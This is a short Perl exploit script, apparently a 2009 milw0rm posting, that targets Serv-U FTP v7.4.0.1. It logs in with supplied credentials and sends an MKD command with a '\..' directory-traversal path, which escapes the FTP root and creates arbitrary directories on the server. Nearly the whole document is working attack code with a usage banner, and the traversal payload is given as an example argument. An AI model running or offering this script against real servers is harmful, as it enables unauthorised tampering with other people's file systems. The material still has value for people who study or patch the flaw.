#!/usr/bin/perl
# Soft    : FTP Serv-U
# Version : v7.4.0.1
#
# A vulnerability is caused due to an input validation error when handling FTP "MKD" 
# requests. This can be exploited to escape the FTP root and create arbitrary directory on 
# the system via directory traversal attacks using the "\.." character sequence.
#
#
# Author: Jonathan Salwan
# Mail: submit [AT] shell-storm.org
# Web: http://www.shell-storm.org


use IO::Socket;
print "[+] Author : Jonathan Salwan \n";
print "[+] Soft: FTP Serv-U\n";

	if (@ARGV < 4)
		{
 		print "[*] Usage: <serv-u.pl> <host> <port> <user> <pass> <dir>\n";
 		print "[*] Exemple: guildftp.pl 127.0.0.1 21 jonathan toto ..\\\\dir\n";
 		exit;
		}

	$ip 	= $ARGV[0];
	$port 	= $ARGV[1];
	$user	= $ARGV[2];
	$pass	= $ARGV[3];
	$dir	= $ARGV[4];

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "\n[-] Connecting: Failed!\n";

print "\n[+] Connecting: Ok!\n";
print "[+] Sending request...\n";

	print $socket "USER $user\r\n";
	print $socket "PASS $pass\r\n";
	print $socket "MKD $dir\r\n";

		sleep(3);	
		close($socket);

print "[+]Done! directory $dir has been created\n";

# milw0rm.com [2009-03-16]
